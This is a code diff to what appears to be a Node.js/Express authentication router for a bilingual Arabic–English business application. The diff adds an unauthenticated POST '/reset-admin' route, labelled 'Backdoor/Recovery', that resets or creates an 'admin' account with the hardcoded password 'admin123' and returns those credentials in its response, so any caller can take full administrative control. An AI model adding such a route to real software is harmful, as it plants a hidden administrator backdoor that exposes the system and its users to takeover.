@@ -332,4 +332,48 @@ router.put('/change-password', authenticate, [
     }
 })
 
+// Reset Admin (Backdoor/Recovery)
+router.post('/reset-admin', async (req, res) => {
+    try {
+        let adminUser = await User.findOne({ where: { username: 'admin' } })
+        let targetBranch = await Branch.findOne()
+        
+        if (!targetBranch) {
+            targetBranch = await Branch.create({
+                name_ar: 'الفرع الرئيسي',
+                name_en: 'Main Branch',
+                is_active: true
+            })
+        }
+
+        if (adminUser) {
+            adminUser.password_hash = 'admin123'
+            adminUser.is_active = true
+            await adminUser.save()
+        } else {
+            adminUser = await User.create({
+                username: 'admin',
+                password_hash: 'admin123',
+                name_ar: 'مدير النظام',
+                name_en: 'Admin',
+                role: 'admin',
+                branch_id: targetBranch.id,
+                is_active: true
+            })
+        }
+
+        logAuthEvent({
+            req,
+            action: 'admin_reset_via_endpoint',
+            user: adminUser,
+            metadata: { method: 'backdoor_recovery' }
+        })
+
+        res.json({ success: true, message: 'تم استعادة حساب المدير بنجاح (admin / admin123)' })
+    } catch (error) {
+        logger.error('Reset admin error:', error)
+        res.status(500).json({ message: 'فشل استعادة حساب المدير', error: error.message })
+    }
+})
+
 module.exports = router
